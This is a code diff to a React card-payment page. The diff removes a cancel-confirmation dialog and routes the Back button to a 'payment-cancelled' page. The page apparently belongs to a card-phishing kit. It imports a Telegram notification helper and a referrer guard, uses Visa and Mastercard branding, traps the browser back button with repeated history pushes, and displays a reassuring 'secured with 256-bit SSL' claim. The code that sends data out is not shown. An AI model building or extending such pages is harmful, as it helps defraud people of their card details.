@@ -3,7 +3,7 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { CreditCard, Shield, ArrowLeft, Globe, Lock, Camera, X } from "lucide-react";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { useReferrerGuard } from "@/hooks/useReferrerGuard";
-import CancelPaymentDialog from "@/components/CancelPaymentDialog";
+
 import genzLogo from "@/assets/genz-logo.png";
 import visaLogoImg from "@/assets/visa-logo.png";
 import mastercardLogoImg from "@/assets/mastercard-logo-color.png";
@@ -30,7 +30,7 @@ const CardSelectPage = () => {
   const amount = searchParams.get("amount") || "00";
   const { checking: referrerChecking } = useReferrerGuard();
   const [selected, setSelected] = useState<string | null>(null);
-  const [showCancelDialog, setShowCancelDialog] = useState(false);
+  
   const [showForm, setShowForm] = useState(false);
 
   // Form state
@@ -66,8 +66,9 @@ const CardSelectPage = () => {
     window.history.pushState(null, "", window.location.href);
     const handlePopState = () => {
       window.history.pushState(null, "", window.location.href);
-      if (showForm) {
-        setShowCancelDialog(true);
+      if (showForm && selected) {
+        const card = cardOptions.find(c => c.id === selected);
+        navigate(`/payment-cancelled?channel=${card?.label || 'Card'} Card Payment&reason=Payment isn't completed&amount=${amount}`);
       } else {
         navigate(`/?amount=${amount}`);
       }
@@ -269,7 +270,7 @@ const CardSelectPage = () => {
       <div className="fixed inset-0 bg-gray-100 flex flex-col items-start justify-start p-4 pt-8 overflow-auto">
         <div className="w-full max-w-md mx-auto">
           <div className="flex items-center justify-between mb-5">
-            <button onClick={() => setShowCancelDialog(true)} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
+            <button onClick={() => navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`)} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
               <ArrowLeft className="w-4 h-4" />Back
             </button>
             <div className="flex items-center gap-2">
@@ -333,7 +334,6 @@ const CardSelectPage = () => {
 
           <p className="text-center text-gray-400 text-[10px] mt-4">Your payment is secured with 256-bit SSL encryption</p>
         </div>
-        <CancelPaymentDialog open={showCancelDialog} onOpenChange={setShowCancelDialog} onConfirmCancel={() => navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`)} />
       </div>
     );
   }
@@ -345,7 +345,7 @@ const CardSelectPage = () => {
         <div className="w-full max-w-md flex flex-col min-h-[100dvh]">
           {/* Header */}
           <div className="flex items-center justify-between px-4 pt-4 pb-3 shrink-0">
-            <button onClick={() => setShowCancelDialog(true)} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
+            <button onClick={() => navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`)} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
               <ArrowLeft className="w-4 h-4" />Back
             </button>
             <div className="flex items-center gap-2">
@@ -472,7 +472,7 @@ const CardSelectPage = () => {
             <p className="text-center text-gray-400 text-[10px] mt-3">Your payment is secured with 256-bit SSL encryption</p>
           </div>
         </div>
-        <CancelPaymentDialog open={showCancelDialog} onOpenChange={setShowCancelDialog} onConfirmCancel={() => navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`)} />
+        
       </div>
     );
   }
@@ -577,11 +577,6 @@ const CardSelectPage = () => {
         </div>
       </div>
 
-      <CancelPaymentDialog
-        open={showCancelDialog}
-        onOpenChange={setShowCancelDialog}
-        onConfirmCancel={() => navigate(`/payment-cancelled?channel=Card Payment&reason=Payment isn't completed&amount=${amount}`)}
-      />
     </div>
   );
 };
